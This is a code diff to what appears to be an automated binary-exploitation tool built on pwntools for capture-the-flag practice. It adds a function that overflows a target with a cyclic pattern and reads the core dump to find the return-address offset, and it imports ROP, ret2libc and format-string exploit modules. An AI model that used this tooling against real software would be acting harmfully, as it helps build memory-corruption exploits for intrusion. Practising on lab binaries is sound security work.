@@ -3,7 +3,8 @@ Determines which exploits to call
 """
 
 import re
-from pwn import ELF, process, ROP
+import os
+from pwn import ELF, process, ROP, cyclic, cyclic_find
 from typing import List, Union
 
 from vulnerabilities import FormatString, StackOverflow, get_format_string_vulns, get_stack_overflow_vulns
@@ -12,6 +13,22 @@ from exploits import ret2win, ret2system, ret2execve, ret2syscall, ret2libc, rop
 # Imports exploits for FormatStrings
 from exploits import stack_leak, libc_leak, write_prim, got_overwrite
 import config as c
+
+def get_overflow_size(binary, register='rsp', size_of_input=5000) -> int:
+    """
+    Returns -1 if nothing is found in the core file for the given register.
+    Modify size_of_input to try larger/smaller buffer.
+    Register defaults to rsp but function can be used for any.
+    """
+    p = process(binary)
+    p.sendline(cyclic(size_of_input, n=8))
+    p.wait()
+    # Unsure why solarpanth3r.py uses a try for the corefile.
+    # A corefile is made as soon as process is called with a valid binary.
+    core = p.corefile
+    offset = cyclic_find(core.read(core.registers[register], 8), n=8)
+    os.remove(core.file.name)
+    return offset
 
 
 def end_prog(flag: str) -> None:
